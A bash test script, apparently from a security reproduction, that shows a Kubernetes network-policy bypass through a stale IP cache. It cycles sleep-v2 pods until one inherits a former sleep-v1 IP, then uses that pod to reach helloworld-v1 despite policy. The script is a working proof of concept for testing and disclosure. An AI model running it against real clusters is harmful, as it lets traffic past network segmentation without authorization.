#!/bin/bash
# Note: the content in this file is a subset from test.sh 
# Find the all the IPs of sleep-v1:
SLEEPV1_IPs=$(kubectl get pod -l app=sleep,version=v1 -o json | jq -r '.items[]|.status.podIP')
NODEV1=$(kubectl get pod -l app=helloworld,version=v1 -o=jsonpath='{.items[0].spec.nodeName}')

echo ""
echo "Now that the ip-cache cannot be updated, we can rotate sleep-v2 pods, until we get a pod with an"
echo "ip that used to belong to sleep-v1."
echo ""

# scale sleep-v1 to 0
kubectl scale deploy sleep-v1 --replicas=0
# scale sleep-v2 to 15
kubectl scale deploy sleep-v2 --replicas=15

# rotate sleep-v2 pods until we get a sleep-v2 pod with ip of sleep-v1
while true; do
    # check if we got a click
    for ip in $SLEEPV1_IPs; do
        SLEEPV2POD=$(kubectl get pod -l app=sleep,version=v2 -o json|jq -r '.items|map(select(.status.podIP == "'$ip'"))|map(.metadata.name)|.[0]' )
        if [ -z "$SLEEPV2POD" ] || [ "$SLEEPV2POD" == "null" ]; then
            SLEEPV2POD=""
        else
            echo ""
            echo "Found sleep-v2 pod $SLEEPV2POD ip $ip"
            break
        fi
    done

    if [ -z "$SLEEPV2POD" ]; then
        echo "Matching sleep-v2 not found yet - retrying rollout"
        kubectl rollout restart deployment/sleep-v2
        # rollout status is really verbose, so send output to /dev/null
        kubectl rollout status deployment/sleep-v2 > /dev/null
    else
        break
    fi
done

# Try curl from the sleep-v2 pod we found to the helloworld-v1 deployment. This should fail according to policy
# but will succeed because the ip-cache is not up to date.
echo ""
echo "Trying to curl from sleep-v2 to helloworld-v1. running:"
echo kubectl exec $SLEEPV2POD -- curl -s http://helloworld-v1:5000/hello --max-time 5
(kubectl exec $SLEEPV2POD -- curl -s http://helloworld-v1:5000/hello --max-time 5 && echo "Connection success.")|| echo "Connection Failed."
echo ""
echo ""

